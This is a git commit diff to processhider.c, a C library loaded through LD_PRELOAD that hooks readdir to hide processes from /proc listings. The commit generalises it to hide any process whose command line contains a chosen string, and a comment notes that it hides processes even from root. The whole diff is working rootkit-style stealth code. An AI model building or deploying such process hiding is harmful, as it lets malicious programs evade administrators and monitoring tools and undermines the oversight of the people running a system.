2a946f96f24d5a50ebcf298256753fe024e8ff27
Csonka Mihaly <csonka.mihaly@hotmail.com>
2021-12-06 14:37:36 +0100

    Generalise code to look for a string in cmdline instead of binary name

--- processhider.c
+++ processhider.c
@@ -5,11 +5,17 @@
 #include <dirent.h>
 #include <string.h>
 #include <unistd.h>
+#include <linux/limits.h>
+
+// NOTE: `/proc/<pid>` will still be accessible. However, unlike remounting `/proc` with `hidepid`, this will hide processes even from root.
+
+// should be in `linux/limits.h` but compiler doesn't seem to find it for some reason
+#define ARG_MAX       131072	/* # bytes of args + environ for exec() */
 
 /*
- * Every process with this name will be excluded
+ * Every process which includes this string in its cmdline will be filtered
  */
-static const char* process_to_filter = "evil_script.py";
+static const char* str_to_filter = "alacritty";
 
 /*
  * Get a directory name given a DIR* handle
@@ -21,8 +27,8 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
         return 0;
     }
 
-    char tmp[64];
-    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
+    char tmp[size];
+    snprintf(tmp, size, "/proc/self/fd/%d", fd);
     ssize_t ret = readlink(tmp, buf, size);
     if(ret == -1) {
         return 0;
@@ -33,41 +39,39 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
 }
 
 /*
- * Get a process name given its pid
+ * Get a process cmdline given its pid
  */
-static int get_process_name(char* pid, char* buf)
+static int get_cmdline(char* pid, char* buf, size_t size)
 {
     if(strspn(pid, "0123456789") != strlen(pid)) {
         return 0;
     }
 
-    char tmp[256];
-    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
- 
+    char tmp[size];
+    snprintf(tmp, size, "/proc/%s/cmdline", pid);
+
     FILE* f = fopen(tmp, "r");
     if(f == NULL) {
         return 0;
     }
 
-    if(fgets(tmp, sizeof(tmp), f) == NULL) {
+    if(fgets(buf, size, f) == NULL) {
         fclose(f);
         return 0;
     }
-
     fclose(f);
 
-    int unused;
-    sscanf(tmp, "%d (%[^)]s", &unused, buf);
     return 1;
 }
 
+// the `\` are needed for original_##readdir to be interpretted properly apparently?
 #define DECLARE_READDIR(dirent, readdir)                                \
 static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                         \
 struct dirent* readdir(DIR *dirp)                                       \
 {                                                                       \
     if(original_##readdir == NULL) {                                    \
-        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
+        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \
         if(original_##readdir == NULL)                                  \
         {                                                               \
             fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
@@ -80,12 +84,12 @@ struct dirent* readdir(DIR *dirp)                                       \
     {                                                                   \
         dir = original_##readdir(dirp);                                 \
         if(dir) {                                                       \
-            char dir_name[256];                                         \
-            char process_name[256];                                     \
+            char dir_name[PATH_MAX];                                    \
+            char cmdline[ARG_MAX + NAME_MAX + PATH_MAX];                \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
+                get_cmdline(dir->d_name, cmdline, sizeof(cmdline)) &&   \
+                strstr(cmdline, str_to_filter) != 0) {                  \
                 continue;                                               \
             }                                                           \
         }                                                               \
